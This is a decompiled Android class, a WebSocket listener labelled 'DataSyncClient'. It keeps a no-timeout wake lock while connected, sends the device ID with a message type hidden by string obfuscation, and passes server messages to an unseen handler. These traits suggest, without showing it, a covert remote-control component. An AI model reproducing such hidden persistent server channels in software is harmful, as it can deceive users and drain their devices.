package p000;

import android.os.PowerManager;
import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.util.StringUtil;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: qg */
/* loaded from: classes2.dex */
public final class C1109qg extends WebSocketListener {

    /* renamed from: a0 */
    public final /* synthetic */ C0267a0 f59502a0;

    /* renamed from: a1 */
    public final /* synthetic */ long f59503a1;

    public C1109qg(C0267a0 c0267a0, long j) {
        this.f59502a0 = c0267a0;
        this.f59503a1 = j;
    }

    @Override // okhttp3.WebSocketListener
    public final void onClosed(WebSocket webSocket, int i, String str) {
        t60.m214695b6(webSocket, "webSocket");
        t60.m214695b6(str, "reason");
        if (this.f59502a0.f52267a7 != this.f59503a1) {
            return;
        }
        t60.m214726f4("DataSyncClient", "⚠️ WebSocket已关闭: code=" + i + ", reason=" + str);
        try {
            String str2 = AbstractC0315a0.f53025a0;
            AbstractC0315a0.m211545a7("WebSocket被关闭 code=" + i + " reason=" + str);
        } catch (Exception unused) {
        }
        this.f59502a0.m211364a5();
    }

    @Override // okhttp3.WebSocketListener
    public final void onClosing(WebSocket webSocket, int i, String str) {
        t60.m214695b6(webSocket, "webSocket");
        t60.m214695b6(str, "reason");
        if (this.f59502a0.f52267a7 != this.f59503a1) {
            return;
        }
        t60.m214726f4("DataSyncClient", "WebSocket正在关闭: code=" + i + ", 等待 onClosed");
    }

    @Override // okhttp3.WebSocketListener
    public final void onFailure(WebSocket webSocket, Throwable th, Response response) {
        t60.m214695b6(webSocket, "webSocket");
        t60.m214695b6(th, "t");
        if (this.f59502a0.f52267a7 != this.f59503a1) {
            return;
        }
        tz0.m214807a7("❌ WebSocket连接失败: ", th.getMessage(), "DataSyncClient");
        try {
            String str = AbstractC0315a0.f53025a0;
            AbstractC0315a0.m211545a7("WebSocket连接失败 " + th.getMessage());
        } catch (Exception unused) {
        }
        this.f59502a0.m211364a5();
    }

    @Override // okhttp3.WebSocketListener
    public final void onMessage(WebSocket webSocket, String str) {
        t60.m214695b6(webSocket, "webSocket");
        t60.m214695b6(str, "text");
        C0267a0.m211359a0(this.f59502a0, str);
    }

    @Override // okhttp3.WebSocketListener
    public final void onOpen(WebSocket webSocket, Response response) {
        WebSocket webSocket2;
        t60.m214695b6(webSocket, "webSocket");
        t60.m214695b6(response, "response");
        if (this.f59502a0.f52267a7 != this.f59503a1) {
            webSocket.close(1000, "Old connection");
            return;
        }
        try {
            C0267a0 c0267a0 = this.f59502a0;
            if (c0267a0.f52272b2 == null) {
                Object systemService = c0267a0.f52260a0.getSystemService("power");
                PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
                if (powerManager != null) {
                    C0267a0 c0267a02 = this.f59502a0;
                    PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(1, "app:SyncLock");
                    wakeLockNewWakeLock.setReferenceCounted(false);
                    c0267a02.f52272b2 = wakeLockNewWakeLock;
                }
            }
            PowerManager.WakeLock wakeLock = this.f59502a0.f52272b2;
            if (wakeLock != null && !wakeLock.isHeld()) {
                PowerManager.WakeLock wakeLock2 = this.f59502a0.f52272b2;
                t60.m214692b3(wakeLock2);
                wakeLock2.acquire();
                t60.m214714d6("DataSyncClient", "✅ WebSocket WakeLock 已获取（无超时，跟随连接生命周期）");
            }
        } catch (Exception unused) {
        }
        C0267a0 c0267a03 = this.f59502a0;
        synchronized (c0267a03.f52268a8) {
            c0267a03.f52263a3 = true;
            c0267a03.f52264a4 = false;
        }
        t60.m214714d6("DataSyncClient", "✅ WebSocket连接成功");
        C0267a0 c0267a04 = this.f59502a0;
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", "status");
            jSONObject.put("sessionId", c0267a04.f52270b0);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("type", StringUtil.m212470a0("L1wHM049MyZSMDlNEz9MLA=="));
            jSONObject2.put("deviceId", c0267a04.f52270b0);
            jSONObject2.put("wsConnected", true);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            jSONObject.put("data", jSONObject2);
            jSONObject.put("timestamp", System.currentTimeMillis());
            synchronized (c0267a04.f52268a8) {
                if (c0267a04.f52263a3 && (webSocket2 = c0267a04.f52266a6) != null) {
                    String string = jSONObject.toString();
                    t60.m214694b5(string, "msg.toString()");
                    webSocket2.send(string);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("DataSyncClient", "发送连接心跳失败", e);
        }
        this.f59502a0.f52262a2.invoke(Boolean.TRUE);
    }

    @Override // okhttp3.WebSocketListener
    public final void onMessage(WebSocket webSocket, ByteString byteString) {
        t60.m214695b6(webSocket, "webSocket");
        t60.m214695b6(byteString, "bytes");
        C0267a0.m211359a0(this.f59502a0, byteString.utf8());
    }
}
